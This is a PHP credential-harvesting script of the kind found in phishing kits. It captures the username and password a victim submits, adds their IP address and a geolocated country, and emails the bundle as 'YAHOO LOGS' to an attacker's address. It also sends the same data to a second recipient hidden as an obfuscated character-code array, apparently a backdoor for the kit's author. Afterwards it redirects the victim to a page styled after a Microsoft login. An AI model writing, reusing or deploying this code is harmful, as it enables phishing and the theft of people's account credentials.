<?php
ob_start();
session_start();
session_regenerate_id();
$adddate=date("D M d, Y g:i a");
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}
$message .= "---- : || BANK WIRE || :------\n";
$message .= "--------   GENERAL     -----------\n";
$message .= "Email: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "=============IP & DATE==============\n";
$message .= "IP: ".$ip."\n";
$message .= "Country : ".$country."\n";
$message .= "Date: ".$adddate."\n";
$message .= "----: ||BANK WIRE|| :------\n";
$message .= "====================================\n";
$recipient ="hairbyjike@aol.com";
$subject = "AUTOPAGE|YAHOO LOGS|".$ip."\n";
$headers = "From: Autopage@ ";
$arr = country_sort();
foreach ($arr as $recipient)

'BANK-Mailer: PHP/' . phpversion();
mail($recipient,$subject,$message,$headers);

$email = $_POST['username'];
header("Location: success.php?LoginOptions%3D3%26estsredirect%3d2%26estsrequest%3drQIIAXWSu2_TUBSH46QNbQWlQkggMdChE5KT68d1HlIl2jhNWyV22zgPW0hV4kdtJ743sW96E29sjJ0QVEwslbrBhJBYWJCKQJ27wYSYEAuMuH8Ay9EZzpF-j-9Rhstx5TVREGGv0C-xpZ4ksGKJA2xP5CVWgIIk8ICzIBDCO0srH78ZbPunrD4vfr719NOHN-fMPZeQUVTO5ymlOew4nmnnTBzk3zHMJcP8YJjT9LyN2FbzPB1JglSARVEoSRAUpJJYAjklPnCNjhLocZUYWoNXZgCota2grg0DJTaJ2mn7Cr8_UzUr0H3XV2staASNqeJvkIa_FegeAMlO69ogVjSdGHIDGNruwJB3XV3T4VX6troxIS5_PXDoxfbv9KKDw-BwhCNymjlj1JGNdqwKRsg2Se76zEbEM3vEw2gvxCM7JJ4drVdbXas69FG92zZ4KB-OVdrhZAAQrtO23N2LJ_RIZq0ipNCtbs4swLYi7Viiulzbp05lMHWinTYLmyoqymAqumGn5_Qn_WOu1kTekdzdpwhOSM2x-Gp7B29vRnZX13cxGoxnHbPRMN9mskmsAUYXmeVEFPKs1VGIHW9of8888LH9OPASByR56Jl4OPSiRP51EZdzzM-5myBTXlhYWkndT62m_s4xr-eTLr-uvXpiLuPtF8cPv7z8c5a6mM8XxjKO42ahVg9HzcaYN8YHUwcOaYFTKqDvwnqlGaEtOpGO6DoscydZ5iSb_ZVlnt1IvV_8HwlXS3cTgopswhTPr_J8mZfKgmT8Aw2&cbcxt&email=".$email);

?>
